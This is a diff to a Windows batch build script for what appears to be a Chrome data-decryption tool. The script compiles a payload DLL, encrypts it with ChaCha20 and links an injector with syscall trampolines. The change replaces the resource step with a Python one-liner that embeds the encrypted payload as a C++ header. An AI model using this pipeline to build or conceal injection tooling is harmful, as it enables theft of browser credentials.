@@ -35,7 +35,6 @@ call :compile_sqlite
 call :compile_payload
 call :compile_encryptor
 call :encrypt_payload
-call :compile_resource
 call :compile_injector
 goto :done
 
@@ -43,6 +42,7 @@ goto :done
 echo Cleaning build directory...
 if exist "%BUILD_DIR%" rd /s /q "%BUILD_DIR%"
 if exist "%FINAL_EXE_NAME%" del /q "%FINAL_EXE_NAME%"
+if exist "%SRC_DIR%\payload\embedded_payload.h" del /q "%SRC_DIR%\payload\embedded_payload.h"
 echo Clean complete.
 goto :eof
 
@@ -61,7 +61,6 @@ goto :eof
 call :compile_sqlite
 call :compile_payload
 call :encrypt_payload
-call :compile_resource
 call :compile_injector
 echo.
 echo =============================================================================
@@ -118,15 +117,18 @@ goto :eof
 :encrypt_payload
 echo [4/6] Encrypting Payload...
 "%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.enc"
-goto :eof
 
-:compile_resource
-echo [5/6] Compiling Resource...
-rc.exe /nologo /i "%BUILD_DIR%" /fo "%BUILD_DIR%\resource.res" "%SRC_DIR%\resource.rc"
+echo [4b/6] Generating embedded payload header...
+
+python -c "data=open('build/chrome_decrypt.enc','rb').read(); print('  [+] Payload size:', len(data), 'bytes'); f=open('src/payload/embedded_payload.h','w'); f.write('#pragma once\n#include <cstddef>\n\nconst unsigned char g_encryptedPayload[] = {\n'); [f.write('    '+', '.join(['0x{:02x}'.format(b) for b in data[i:i+16]])+('' if i+16>=len(data) else ',')+'\n') for i in range(0,len(data),16)]; f.write('};\n\nconst size_t g_encryptedPayloadSize = sizeof(g_encryptedPayload);\n'); f.close(); print('  [+] Generated: src/payload/embedded_payload.h')"
+if errorlevel 1 (
+    echo ERROR: Failed to generate embedded payload header
+    exit /b 1
+)
 goto :eof
 
 :compile_injector
-echo [6/6] Compiling Injector...
+echo [5/6] Compiling Injector...
 if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
     armasm64.exe -nologo "%SRC_DIR%\sys\syscall_trampoline_arm64.asm" -o "%BUILD_DIR%\syscall_trampoline.obj"
 ) else (
@@ -146,7 +148,7 @@ link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
     "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
     "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
     "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
-    "%BUILD_DIR%\syscall_trampoline.obj" "%BUILD_DIR%\resource.res" ^
+    "%BUILD_DIR%\syscall_trampoline.obj" ^
     version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
 goto :eof
 
